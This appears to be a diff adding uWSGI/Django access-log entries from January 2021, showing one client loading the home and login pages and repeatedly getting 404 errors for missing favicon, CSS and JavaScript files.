+Not Found: /indexApp/static/img/favicon.ico
+[pid: 1777|app: 0|req: 7/29] 123.13.93.44 () {46 vars in 1489 bytes} [Sun Jan 24 18:24:50 2021] GET /indexApp/static/img/favicon.ico => generated 2640 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 1768|app: 0|req: 21/30] 123.13.93.44 () {42 vars in 1397 bytes} [Sun Jan 24 18:24:57 2021] GET /favicon.ico => generated 2580 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 1768|app: 0|req: 22/31] 123.13.93.44 () {42 vars in 1425 bytes} [Sun Jan 24 18:25:04 2021] GET / => generated 231 bytes in 1 msecs (HTTP/1.1 200) 5 headers in 166 bytes (1 switches on core 0)
+[pid: 1768|app: 0|req: 23/32] 123.13.93.44 () {46 vars in 1478 bytes} [Sun Jan 24 18:25:05 2021] GET / => generated 231 bytes in 1 msecs (HTTP/1.1 200) 5 headers in 166 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 1777|app: 0|req: 8/33] 123.13.93.44 () {46 vars in 1443 bytes} [Sun Jan 24 18:25:05 2021] GET /favicon.ico => generated 2580 bytes in 3 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 1768|app: 0|req: 24/34] 123.13.93.44 () {42 vars in 1437 bytes} [Sun Jan 24 18:25:08 2021] GET /login/ => generated 2626 bytes in 1 msecs (HTTP/1.1 200) 5 headers in 167 bytes (1 switches on core 0)
+Not Found: /indexApp/static/img/favicon.ico
+[pid: 1768|app: 0|req: 25/35] 123.13.93.44 () {42 vars in 1487 bytes} [Sun Jan 24 18:25:22 2021] GET /indexApp/static/img/favicon.ico => generated 2640 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 1768|app: 0|req: 26/36] 123.13.93.44 () {42 vars in 1421 bytes} [Sun Jan 24 18:25:27 2021] GET /favicon.ico => generated 2580 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 1768|app: 0|req: 27/37] 123.13.93.44 () {44 vars in 1468 bytes} [Sun Jan 24 18:28:22 2021] GET /login/ => generated 2626 bytes in 1 msecs (HTTP/1.1 200) 5 headers in 167 bytes (1 switches on core 0)
+[pid: 1768|app: 0|req: 28/38] 123.13.93.44 () {44 vars in 1468 bytes} [Sun Jan 24 18:30:30 2021] GET /login/ => generated 2626 bytes in 1 msecs (HTTP/1.1 200) 5 headers in 167 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 1768|app: 0|req: 29/39] 123.13.93.44 () {42 vars in 1412 bytes} [Sun Jan 24 18:30:48 2021] GET /favicon.ico => generated 2580 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 1925|app: 0|req: 39/154] 123.13.93.44 () {44 vars in 1456 bytes} [Sun Jan 24 18:48:09 2021] GET / => generated 2585 bytes in 1 msecs (HTTP/1.1 200) 5 headers in 167 bytes (1 switches on core 0)
+Not Found: /css/all.min.css
+[pid: 1917|app: 0|req: 27/155] 123.13.93.44 () {42 vars in 1402 bytes} [Sun Jan 24 18:48:09 2021] GET /css/all.min.css => generated 2177 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /css/dmaku.css
+[pid: 1925|app: 0|req: 40/156] 123.13.93.44 () {42 vars in 1398 bytes} [Sun Jan 24 18:48:09 2021] GET /css/dmaku.css => generated 2171 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /js/dmaku.js
+[pid: 1926|app: 0|req: 18/157] 123.13.93.44 () {42 vars in 1379 bytes} [Sun Jan 24 18:48:09 2021] GET /js/dmaku.js => generated 2165 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /img/favicon.ico
+[pid: 1917|app: 0|req: 28/158] 123.13.93.44 () {42 vars in 1398 bytes} [Sun Jan 24 18:48:09 2021] GET /img/favicon.ico => generated 2177 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 1925|app: 0|req: 41/159] 123.13.93.44 () {46 vars in 1478 bytes} [Sun Jan 24 18:48:11 2021] GET / => generated 2585 bytes in 1 msecs (HTTP/1.1 200) 5 headers in 167 bytes (1 switches on core 0)
+Not Found: /css/all.min.css
+[pid: 1917|app: 0|req: 29/160] 123.13.93.44 () {46 vars in 1455 bytes} [Sun Jan 24 18:48:11 2021] GET /css/all.min.css => generated 2177 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /css/dmaku.css
+[pid: 1926|app: 0|req: 19/161] 123.13.93.44 () {46 vars in 1451 bytes} [Sun Jan 24 18:48:11 2021] GET /css/dmaku.css => generated 2171 bytes in 8 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /js/dmaku.js
+[pid: 1918|app: 0|req: 11/162] 123.13.93.44 () {46 vars in 1432 bytes} [Sun Jan 24 18:48:11 2021] GET /js/dmaku.js => generated 2165 bytes in 6 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /img/favicon.ico
+[pid: 1925|app: 0|req: 42/163] 123.13.93.44 () {46 vars in 1451 bytes} [Sun Jan 24 18:48:11 2021] GET /img/favicon.ico => generated 2177 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /css/all.min.css
+[pid: 1925|app: 0|req: 43/164] 123.13.93.44 () {42 vars in 1455 bytes} [Sun Jan 24 18:48:24 2021] GET /css/all.min.css => generated 2177 bytes in 3 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /css/dmaku.css
+[pid: 1925|app: 0|req: 44/165] 123.13.93.44 () {42 vars in 1451 bytes} [Sun Jan 24 18:48:27 2021] GET /css/dmaku.css => generated 2171 bytes in 9 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /img/favicon.ico
+[pid: 1925|app: 0|req: 45/166] 123.13.93.44 () {42 vars in 1455 bytes} [Sun Jan 24 18:48:40 2021] GET /img/favicon.ico => generated 2177 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 1917|app: 0|req: 30/167] 123.13.93.44 () {42 vars in 1405 bytes} [Sun Jan 24 18:48:40 2021] GET /favicon.ico => generated 2165 bytes in 3 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /img/favicon.ico
+[pid: 1925|app: 0|req: 46/168] 123.13.93.44 () {44 vars in 1486 bytes} [Sun Jan 24 18:49:09 2021] GET /img/favicon.ico => generated 2177 bytes in 3 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 1925|app: 0|req: 47/169] 123.13.93.44 () {42 vars in 1425 bytes} [Sun Jan 24 18:49:13 2021] GET / => generated 2613 bytes in 1 msecs (HTTP/1.1 200) 5 headers in 167 bytes (1 switches on core 0)
+[pid: 1925|app: 0|req: 48/170] 123.13.93.44 () {44 vars in 1456 bytes} [Sun Jan 24 18:49:20 2021] GET / => generated 2613 bytes in 1 msecs (HTTP/1.1 200) 5 headers in 167 bytes (1 switches on core 0)
+[pid: 1925|app: 0|req: 49/171] 123.13.93.44 () {46 vars in 1478 bytes} [Sun Jan 24 18:49:26 2021] GET / => generated 2613 bytes in 1 msecs (HTTP/1.1 200) 5 headers in 167 bytes (1 switches on core 0)
